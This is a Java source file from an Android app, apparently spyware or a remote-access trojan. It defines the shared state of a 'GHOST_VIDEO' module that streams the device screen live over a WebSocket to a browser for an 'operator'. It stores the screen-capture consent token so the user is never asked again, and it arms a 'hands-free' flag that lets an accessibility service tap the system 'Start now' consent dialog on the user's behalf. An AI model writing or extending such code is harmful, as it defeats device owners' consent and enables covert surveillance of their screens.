package com.labs.labrats;

import android.content.Intent;
import android.os.SystemClock;

/**
 * GHOST_VIDEO v3: shared state for the hardware-encoded realtime screen uplink.
 *
 * Pipeline: MediaProjection -> VirtualDisplay -> MediaCodec (H.264) ->
 * Fmp4Muxer -> WebSocket -> browser <video> (MSE). 30/60 fps, sub-second glass lag.
 *
 * Holds the one-time MediaProjection consent token so quality switches and
 * service restarts never re-prompt, plus the auto-accept arm flag that lets
 * the accessibility core tap the system "Start now" dialog hands-free.
 */
public final class GhostVideoSession {

    private GhostVideoSession() {}

    public static final int WS_PORT = 9193;

    /** Capture profiles: width cap px / fps / video bitrate bps. */
    public enum VideoProfile {
        SMOOTH(540, 30, 1200000),
        BALANCED(720, 30, 2500000),
        ULTRA(720, 60, 4500000);

        public final int widthCap;
        public final int fps;
        public final int bitrate;

        VideoProfile(int widthCap, int fps, int bitrate) {
            this.widthCap = widthCap;
            this.fps = fps;
            this.bitrate = bitrate;
        }
    }

    // ---- consent token (granted once, reused until reboot/revoke) ----
    private static volatile int resultCode = -1;
    private static volatile Intent resultData;
    private static volatile boolean tokenReady = false;

    // ---- operator selection + runtime state ----
    private static volatile VideoProfile profile = VideoProfile.BALANCED;
    private static volatile String state = "IDLE"; // IDLE|CONSENT|STARTING|LIVE|DENIED|ERROR|STOPPED
    private static volatile String lastError = "";
    private static volatile long stateChangedAt = 0;

    // ---- hands-free consent dialog auto-accept ----
    private static volatile long autoAcceptUntil = 0;

    public static synchronized void storeToken(int code, Intent data) {
        resultCode = code;
        resultData = data != null ? new Intent(data) : null;
        tokenReady = (data != null);
    }

    public static boolean hasToken() {
        return tokenReady && resultData != null;
    }

    public static int getResultCode() {
        return resultCode;
    }

    public static Intent getResultData() {
        return resultData != null ? new Intent(resultData) : null;
    }

    public static synchronized void clearToken() {
        tokenReady = false;
        resultData = null;
    }

    public static synchronized void setProfile(String name) {
        if (name == null) return;
        try {
            profile = VideoProfile.valueOf(name.trim().toUpperCase());
        } catch (IllegalArgumentException ignored) {}
    }

    public static VideoProfile getProfile() {
        return profile;
    }

    public static String getProfileName() {
        return profile.name().toLowerCase();
    }

    public static synchronized void setState(String s) {
        state = s != null ? s : "IDLE";
        stateChangedAt = SystemClock.uptimeMillis();
    }

    public static String getState() {
        return state;
    }

    public static long getStateAgeMs() {
        return stateChangedAt == 0 ? -1 : SystemClock.uptimeMillis() - stateChangedAt;
    }

    public static synchronized void setError(String e) {
        lastError = e != null ? e : "";
        if (!lastError.isEmpty()) {
            state = "ERROR";
            stateChangedAt = SystemClock.uptimeMillis();
        }
    }

    public static String getLastError() {
        return lastError;
    }

    /** Arm hands-free tapping of the system screen-cast consent dialog. */
    public static void armAutoAccept(long windowMs) {
        autoAcceptUntil = SystemClock.uptimeMillis() + Math.max(1000, windowMs);
    }

    public static void disarmAutoAccept() {
        autoAcceptUntil = 0;
    }

    public static boolean isAutoAcceptArmed() {
        return SystemClock.uptimeMillis() < autoAcceptUntil;
    }
}
